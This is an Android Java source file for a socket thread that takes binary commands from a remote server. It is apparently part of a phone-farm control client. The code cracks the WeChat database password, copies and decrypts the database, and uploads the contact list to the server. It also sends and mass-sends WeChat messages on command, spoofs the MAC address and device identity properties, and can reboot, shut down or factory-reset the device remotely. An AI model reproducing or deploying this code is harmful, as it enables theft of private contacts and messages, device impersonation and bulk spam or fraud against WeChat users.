package com.ruisasi.core;


import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.LocalSocket;
import android.os.PowerManager;
import android.provider.Settings;
import android.system.ErrnoException;
import android.system.Os;
import android.system.OsConstants;
import android.util.Log;

import com.alibaba.fastjson.JSONObject;
import com.genymobile.scrcpy.EventController;
import com.genymobile.scrcpy.IO;

import com.ruisasi.DeviceControl;
import com.ruisasi.core.DataPacket.DataCombine;
import com.ruisasi.weChat.DatabaseTools;
import com.ruisasi.weChat.WeChatDatabase;
import com.ruisasi.weChat.domain.Contact;
import com.ruisasi.weChat.domain.GroupMessage;
import com.ruisasi.weChat.domain.WeChatMessage;
import com.wangheart.rtmpfile.rtmp.RtmpHandle;
import com.wangheart.rtmpfile.rtmp.model.ApcMsg;

import net.sqlcipher.database.SQLiteDatabase;

import java.io.BufferedInputStream;
import java.io.FileDescriptor;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.net.Socket;
import java.util.ArrayList;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;


public class SocketRecvThread extends Thread{
 private String mac,manufacturer,brand,device,model,board;

    public static String TAG ="TAG";
    private FileDescriptor fd;
    private Socket socket;
    public boolean flag = true;
    private VideoStreamSend vss;
    private LocalSocket ls;
    private ObjectOutputStream oos;
    byte bs[] = new byte[16];
    private boolean first  = true;
    private  WeChatDatabase wd;
    private  String databasePwd;
    private Intent intent;
    private Lock lock = new ReentrantLock();

    private Context mContext;
    private DeviceControl dc = new DeviceControl();
    private InputStream is;

    public SocketRecvThread(FileDescriptor fd, Socket socket, VideoStreamSend vss, LocalSocket ls, Context context){
        flag = true;
    this.fd = fd;
    this.socket = socket;
    this.vss = vss;

    this.ls = ls;
    this.mContext = context;
    try {
        oos = new ObjectOutputStream(ls.getOutputStream());
    }catch (IOException e){

    }
        wd = new WeChatDatabase(context);
        databasePwd =  wd.getPassword(); //破解并获取数据库密码
    }
    public SocketRecvThread(FileDescriptor fd, Socket socket, VideoStreamSend vss,  Context context){
        this.fd = fd;
        this.socket = socket;
        this.vss = vss;


    }


    @Override
    public void run() {
        super.run();

        while(flag){
                if(socket.isConnected()){

                    try{
                      //  Log.i(StartActivity.TAG,"coming SocketRecvThread run()");
                      is =  socket.getInputStream();
                     int len =  is.read(bs,0,bs.length);//直到读到16个字符

                        if(len ==-1){
                            Log.i("StartActivity","lenth :"+len);

                            MainService.sleepBitcon = false;
                            break;
                        }
                        if (len != 16) {//长度小于16的内容
                            byte[] bl = new byte[len];
                            is.read(bl,0,len);
                            continue;
                        }

                        Log.i("StartActivity","读取内容的长度"+len);
                    }catch (IOException e){
                        Log.i("StartActivity","Exception e :"+e.getMessage());
                        flag = false;
                        break;
                }
                    ApcMsg apc = new ApcMsg(new ApcMsg.MsgHead(bs));
                    Log.i("StartActivity","  command :"+apc.getCmdId());
                    if(apc.getVersion()!=0x01||apc.getCmdId()>0x16||apc.getCmdId()<=0) {
                        byte[] bla = new byte[4096];
                        try {
                            int len = is.read(bla, 0, bla.length);
                            Log.i("TAG","错误的数据处理 ：长度:"+len);
                        }catch (IOException e){

                        }
                        continue;
                    }

                    if(apc.getCmdId() == 0x06){//打开屏幕控制

                        vss = new VideoStreamSend(socket);
                        vss.start();//屏幕与键盘
                        //长度合成的头
                        byte[] head = CommandParser.SetcombinLen(bs, 1);
                        try{
                            Log.i("StartActivity","打开流");
                            //写入头
                            //生成身体
                            byte[] body = CommandParser.Videopacket(true);
                        SocketSendThread.lock1.lock();
                            IO.writeFully(fd,head,0,head.length);
                            IO.writeFully(fd,body,0,body.length);
                        SocketSendThread.lock1.unlock();
                        }catch (IOException e){

                        }

                    }else if (apc.getCmdId() == 0x04) {//1重启/2关机/3恢复出厂设置
                        Log.e("TAG", "download  0x04  1重启/2关机/3恢复出厂设置");

                        //JSONObject body = new SetDeviceInfoEncode().praseMsgBody(bodyBytes);
                        int bodylen  = apc.getTotalLen() -16;
                        byte[] body = new byte[bodylen];
                        try {
                            IO.readFully(fd, body, 0, body.length);
                        }catch (IOException e){

                        }


                        Log.e("TAG", "download  0x04  1重启/2关机/3恢复出厂设置---type = " + body[0]);
                        dc.resultServer(fd, apc, (byte)1);

                        if (body[0] ==1) {//重启

                            PowerManager pManager=(PowerManager) mContext.getSystemService(Context.POWER_SERVICE);
                            pManager.reboot("Reboot");
                        } else if (body[0] ==2) {//2关机
                            intent = new Intent(dc.getIntentAction("android.content.Intent","ACTION_REQUEST_SHUTDOWN"));
                            intent.putExtra(dc.getIntentAction("android.content.Intent","EXTRA_KEY_CONFIRM"), false);
                            mContext.startActivity(intent);
                        } else if (body[0] ==3) {//3恢复出厂设置
                            intent = new Intent(dc.getIntentAction("android.content.Intent","ACTION_FACTORY_RESET"));
                            intent.setPackage("android");
                            intent.addFlags(Intent.FLAG_RECEIVER_FOREGROUND);
                            intent.putExtra(dc.getIntentAction("android.content.Intent","EXTRA_REASON"),"MasterClearConfirm");
                            mContext.sendBroadcast(intent);
                        }
                    }
                    else  if (apc.getCmdId() == 0x03) {
                        Log.e(TAG, "download  0x03服务器设置设备信息 --解析服务器传过来的数据");
                        //解析服务器传过来的设备信息
                        int bodylen  = apc.getTotalLen() -16;
                        byte[] bodyBytes = new byte[bodylen];
                        try {
                            IO.readFully(fd, bodyBytes, 0, bodyBytes.length);
                        }catch (IOException e){

                        }
                        JSONObject js = new GetDeviceInfoEncode().praseMsgBody(bodyBytes);
                        mac = js.getString("mac");
                        model = js.getString("model");
                        brand = js.getString("brand");
                        device = js.getString("device");
                        board = js.getString("board");
                        manufacturer = js.getString("manufacturer");
                        Log.e(TAG, " 0x03-mac = " + mac + ";model = " + model + ";brand = " + brand + ";device = " + device
                                + ";board = " + board + ";manufacturer = " + manufacturer);

                        Log.i("TAG1","macAddressValue  :"+dc.macAddressValue);
                        if (mac != null && !mac.equals(dc.macAddressValue)) {
                            Log.i("TAG","mac  :"+mac);
                            Log.i("TAG","macAddressValue  :"+dc.macAddressValue);
                            Settings.Global.putString(mContext.getContentResolver(), dc.getSettings("PRODUCT_MACADRESS"), mac);
                        }
                        if (board != null && (!board.equals(dc.boardValue) || !model.equals(dc.modelValue)
                                || !device.equals(dc.deviceValue) || !brand.equals(dc.brandValue)
                                || !manufacturer.equals(dc.manufacturerValue))) {
                            dc.setProperty("persist.product.manufacturer", manufacturer);
                            dc.setProperty("persist.product.brand", brand);
                            dc.setProperty("persist.product.device", device);
                            dc.setProperty("persist.product.model", model);
                            dc.setProperty("persist.product.board", board);
                        }
                        dc.resultServer(fd, apc, (byte)1);



                    }else  if (apc.getCmdId() == ApcMsg.CMD_ID_GET_DEVICE_INFO) {
                        dc.getDeviceInfo(mContext);
                        Log.e(TAG, "download  0x02服务器获取设备信息 --上传设备信息");
                        Log.i("TAG","macAddressValue  :"+dc.macAddressValue);
                        Log.i("TAG","boardValue  :"+dc.boardValue);
                        if (dc.macAddressValue != null && dc.boardValue != null) {
                            dc.sendDeviceInfo(fd,apc);
                        }
                    }
                    else if(apc.getCmdId() == 0x07){//关闭屏幕控制
                        //长度合成的头
                        byte[] head = CommandParser.SetcombinLen(bs, 1);
                        if(vss!=null) {
                            VideoStreamSend.stopStream = false;
//                                RtmpHandle.getInstance().close();
//                            if(vss.isAlive()){
//                                vss.stop();
//                                RtmpHandle.getInstance().close();
//                            }

                            vss = null;
                        }

                        try{
                            Log.i("StartActivity","关闭流");
                            //写入头
                            //生成身体
                            byte[] body = CommandParser.Videopacket(true);
                            SocketSendThread.lock1.lock();
                            IO.writeFully(fd,head,0,head.length);
                            IO.writeFully(fd,body,0,body.length);
                            SocketSendThread.lock1.unlock();

                        }catch (IOException e){
                        }
                    }
//==================================================================================================
                    else if(apc.getCmdId() == 0x08){//键盘事件

                        try {
                            Log.i("KeyBoard","head  :" + CommandParser.bytesToHexFun(apc.getBytes()));
                        }catch (Exception e){

                        }
                        //唤醒
                            synchronized (EventController.obj) {
                                Log.i("StartActivity", "A notify start");
                                EventController.obj.notify();
                                Log.i("StartActivity", "A notify end");
                            }
                        lock.lock();
                            while(EventController.flag) {

                            }
                            EventController.flag = true;
                        lock.unlock();
                        //长度合成的头
                        byte[] head = CommandParser.SetcombinLen(bs, 1);
                        try{
                            Log.i("StartActivity","键盘鼠标事件");
                            //生成身体
                            byte[] body = CommandParser.Videopacket(true);
                            //写入头
                            SocketSendThread.lock1.lock();
                            IO.writeFully(fd,head,0,head.length);
                            IO.writeFully(fd,body,0,body.length);
                            SocketSendThread.lock1.unlock();

                        }catch (IOException e){

                        }

                    }
                    else if(apc.getCmdId() ==0x09){
                        Log.i("TAG_SEND","微信上报消息的回复");
                        byte[] bsa = new byte[1];
                        try{
                            IO.readFully(fd,bsa,0,1);
                        }catch (IOException e){

                        }
                    }
                    else if(apc.getCmdId() == 0x0B){ //获取联系人
                         try {
                        Log.i("TAG_SEND","服务器信号 请求通讯录");
                            //重新打开


                            wd.copyDatabase();//拷贝微信数据库文件
                            Log.i("TAG_SEND","打开通讯录数据库");
                            SQLiteDatabase db = wd.openDatabase(databasePwd);
                            ArrayList<Contact> list =  DatabaseTools.openContactTable(db);
                            db.close();
                            DataCombine.CombinContact_send(bs, list, fd);
                            MainService.list =list;

                         }catch (IOException e){

                         }

                    }
                    else if(apc.getCmdId() ==0x0A){ //接受服务器发送过来的要发送的微信新消息
                        Log.i("TAG_SEND","服务器 发来新的微信消息");
                        //包体长度
                        try {
                         //读取数据
                        String[] mess=   DataCombine.CombinMessage_recv(apc, fd);
                            Log.i("TAG_SEND","talker :"+mess[0]+" content:"+mess[1]);
                            WeChatMessage wcm = new WeChatMessage(mess[0],mess[1]);

                            oos.writeObject(wcm);
                            oos.flush();
                            Log.i("TAG_SEND","数据发送到微信。。。成功");
                            //                        //发送数据响应
                        byte[] head = CommandParser.SetcombinLen(bs, 1);
                            //生成身体
                            byte[] body = CommandParser.Videopacket(true);
                            SocketSendThread.lock1.lock();
                            IO.writeFully(fd,head,0,head.length);
                            IO.writeFully(fd,body,0,body.length);
                            SocketSendThread.lock1.unlock();
                            Log.i("TAG_SEND","向服务器发送响应成功");
                        }catch (IOException e){

                        }

                    }
                    else if(apc.getCmdId() ==0x0F){ //打开好友聊天窗口
                        Log.i("TAG_SEND","服务器 打开聊天窗口");
                        //包体长度
                        try {
                            //读取数据
                            String talker = DataCombine.getWindowTalker(apc,fd);
                            Log.i("TAG_SEND","聊天者ID :"+talker);
                            //发送数据
                            WeChatMessage wcm = new WeChatMessage(talker);
                            oos.writeObject(wcm);
                            oos.flush();
                            Log.i("TAG_SEND","数据发送到微信。。。成功");
                            //发送数据响应
                            byte[] head = CommandParser.SetcombinLen(bs, 1);
                            //生成身体
                            byte[] body = CommandParser.Videopacket(true);
                            SocketSendThread.lock1.lock();
                            IO.writeFully(fd,head,0,head.length);
                            IO.writeFully(fd,body,0,body.length);
                            SocketSendThread.lock1.unlock();
                            Log.i("TAG_SEND","向服务器发送响应成功");
                        }catch (Exception e){

                        }
                    }
                    else if(apc.getCmdId() ==0x0C){//群发微信消息
                        Log.i("TAG","进入群发组");
                        GroupSendThread.pause= 2;
                        GroupSendThread gst = new GroupSendThread(fd,apc,oos);
                        gst.start();


                    }

                    else if(apc.getCmdId() ==0x0E){ //1 暂停 2:恢复 3：停止
                        int bodylen  = apc.getTotalLen() -16;
                        byte[] body = new byte[bodylen];
                        try {
                            IO.readFully(fd, body, 0, body.length);
                            int pause = DataCombine.Pause_Group_Send(body);
                            Log.i("TAG","PAUSE : "+pause);
                            GroupSendThread.pause = pause;
                            //回复 服务器
                            byte[] head = CommandParser.SetcombinLen(apc.getBytes(),1);
                            byte[] rebody = CommandParser.Videopacket(true);
                            SocketSendThread.lock1.lock();
                            IO.writeFully(fd,head,0,head.length);
                            IO.writeFully(fd,rebody,0,body.length);
                            SocketSendThread.lock1.unlock();

                        }catch (IOException e){

                        }catch (Exception e) {
                        }finally {
                        }
                    }
                    else if(apc.getCmdId() ==0x11){ // 1打开app 2关闭app

                        Log.i("TAG","进入广告投屏");
                        int bodylen  = apc.getTotalLen() -16;
                        Log.i("TAG","body长度 :"+bodylen);
                        byte[] body = new byte[bodylen];
                        try {
                            IO.readFully(fd, body, 0, body.length);
                            Log.i("TAG","body数据 :"+CommandParser.bytesToHexFun(body));
                            JSONObject bodyJson = DataCombine.praseMsgBodyOpenOrCloseApp(body);
                            //type U8  1打开app 2关闭app
                            Byte type = bodyJson.getByte("type");
                            Log.i("TAG","type数据 :"+type);
                            String appPackageName = bodyJson.getString("appPackageName");
                            Log.i("TAG","appPackageName : "+appPackageName +" ;type = "+type);

                            ActivityManager mActivityManager = (ActivityManager) mContext.getSystemService(Context.ACTIVITY_SERVICE);

                            if(type != null && appPackageName != null && type == (byte)1){
                                try {
                                    Method method = Class.forName("android.app.ActivityManager").getMethod("forceStopPackage", String.class);
                                    method.invoke(mActivityManager, appPackageName);  //appPackageName 是需要强制停止的应用程序包名
                                } catch (Exception e) {
                                    Log.e("TAG", "close app 失败" + e.getMessage());
                                    e.printStackTrace();
                                }

                                PackageManager packageManager = mContext.getPackageManager();
                                Intent intent = new Intent();
                                intent = packageManager.getLaunchIntentForPackage(appPackageName);
                                if(intent == null){
                                    Log.e("TAG", "APP not found!");
                                }
                                if(intent != null)
                                mContext.startActivity(intent);
                            } else if(type != null && appPackageName != null && type == (byte)2){
                                try {
                                    Method method = Class.forName("android.app.ActivityManager").getMethod("forceStopPackage", String.class);
                                    method.invoke(mActivityManager, appPackageName);  //appPackageName 是需要强制停止的应用程序包名
                                } catch (Exception e) {
                                    Log.e("TAG", "close app 失败" + e.getMessage());
                                    e.printStackTrace();
                                }
                            }

                            //回复 服务器
                            byte[] head = CommandParser.SetcombinLen(apc.getBytes(),1);
                            byte[] rebody = CommandParser.Videopacket(true);
                            SocketSendThread.lock1.lock();
                            IO.writeFully(fd,head,0,head.length);
                            IO.writeFully(fd,rebody,0,body.length);
                            SocketSendThread.lock1.unlock();

                        }catch (IOException e){

                        }catch (Exception e) {
                        }finally {
                        }
                    }



            }else{
                    Log.i("StartActivity","SocketRecvThread  Line 111 链接失败");
                }
        }
        Log.i("StartActivity","socket 接受线程退出" );
    }
}
